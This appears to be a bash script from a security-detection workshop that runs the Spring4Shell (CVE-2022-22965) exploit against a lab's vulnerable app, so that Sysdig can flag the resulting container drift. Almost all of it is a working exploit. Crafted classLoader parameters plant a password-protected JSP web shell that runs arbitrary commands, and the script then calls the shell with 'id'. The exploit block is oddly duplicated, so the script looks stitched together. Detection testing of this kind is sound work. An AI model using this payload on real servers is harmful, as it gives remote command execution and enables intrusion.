#!/usr/bin/env bash
# Module 7 / Test 7.2 — Spring4Shell (CVE-2022-22965) against the vuln-app.
# Run on the bastion:  ./07-02-example-curls-spring4shell.sh
#
# POSTs crafted class.module.classLoader.* params to /greeting. Spring's data
# binder walks the Tomcat class loader's AccessLogValve and writes a JSP into
# webapps/ROOT. The unexpected JSP appearing/executing in the Tomcat container
# is what Sysdig detects (container drift / new executable at runtime).
set -u

# Robust NodePort target: honor a pre-set NODE_IP, else the first READY node's internal IP; never silently empty (see workshop node-IP note).
NODE_IP="${NODE_IP:-$(kubectl get nodes -o jsonpath='{range .items[*]}{.status.conditions[?(@.type=="Ready")].status} {.status.addresses[?(@.type=="InternalIP")].address}{"\n"}{end}' 2>/dev/null | awk '$1=="True"{print $2; exit}')}"
[ -z "$NODE_IP" ] && { echo "ERROR: could not resolve a Ready node IP via kubectl — run 'sudo bash' so KUBECONFIG is set (or export NODE_IP=<node internal IP>)." >&2; exit 1; }
NODE_PORT=30099
BASE="http://${NODE_IP}:${NODE_PORT}"

echo "[7.2] Spring4Shell — planting shell.jsp via ${BASE}/greeting"
curl -s "${BASE}/greeting" \
  -H 'Content-Type: application/x-www-form-urlencoded' \
  -H 'suffix: %>//' \
  -H 'c1: Runtime' \
  -H 'c2: <%' \
  -H 'DNT: 1' \
  --data-urlencode 'class.module.classLoader.resources.context.parent.pipeline.first.pattern=%{c2}i if(%22j%22.equals(request.getParameter(%22pwd%22))){ java.io.InputStream in = %{c1}i.getRuntime().exec(request.getParameter(%22cmd%22)).getInputStream(); int a = -1; byte[] b = new byte[2048]; while((a=in.read(b))!=-1){ out.println(new String(b)); } } %{suffix}i' \
  --data-urlencode 'class.module.classLoader.resources.context.parent.pipeline.first.suffix=.jsp' \
  --data-urlencode 'class.module.classLoader.resources.context.parent.pipeline.first.directory=webapps/ROOT' \
  --data-urlencode 'class.module.classLoader.resources.context.parent.pipeline.first.prefix=shell' \
  --data-urlencode 'class.module.classLoader.resources.context.parent.pipeline.first.fileDateFormat='
echo

echo "[7.2] verifying the webshell -> ${BASE}/shell.jsp?pwd=j&cmd=id"

# Robust NodePort target: honor a pre-set NODE_IP, else the first READY node's internal IP; never silently empty (see workshop node-IP note).
NODE_IP="${NODE_IP:-$(kubectl get nodes -o jsonpath='{range .items[*]}{.status.conditions[?(@.type=="Ready")].status} {.status.addresses[?(@.type=="InternalIP")].address}{"\n"}{end}' 2>/dev/null | awk '$1=="True"{print $2; exit}')}"
[ -z "$NODE_IP" ] && { echo "ERROR: could not resolve a Ready node IP via kubectl — run 'sudo bash' so KUBECONFIG is set (or export NODE_IP=<node internal IP>)." >&2; exit 1; }
NODE_PORT=30099
BASE="http://${NODE_IP}:${NODE_PORT}"

echo "[7.2] Spring4Shell — planting shell.jsp via ${BASE}/greeting"
curl -s "${BASE}/greeting" \
  -H 'Content-Type: application/x-www-form-urlencoded' \
  -H 'suffix: %>//' \
  -H 'c1: Runtime' \
  -H 'c2: <%' \
  -H 'DNT: 1' \
  --data-urlencode 'class.module.classLoader.resources.context.parent.pipeline.first.pattern=%{c2}i if(%22j%22.equals(request.getParameter(%22pwd%22))){ java.io.InputStream in = %{c1}i.getRuntime().exec(request.getParameter(%22cmd%22)).getInputStream(); int a = -1; byte[] b = new byte[2048]; while((a=in.read(b))!=-1){ out.println(new String(b)); } } %{suffix}i' \
  --data-urlencode 'class.module.classLoader.resources.context.parent.pipeline.first.suffix=.jsp' \
  --data-urlencode 'class.module.classLoader.resources.context.parent.pipeline.first.directory=webapps/ROOT' \
  --data-urlencode 'class.module.classLoader.resources.context.parent.pipeline.first.prefix=shell' \
  --data-urlencode 'class.module.classLoader.resources.context.parent.pipeline.first.fileDateFormat='
echo

echo "[7.2] verifying the webshell -> ${BASE}/shell.jsp?pwd=j&cmd=id"
curl -s "${BASE}/shell.jsp?pwd=j&cmd=id" || true
echo
echo "[7.2] done — check Sysdig for the JSP write / new process in the vuln-app container."
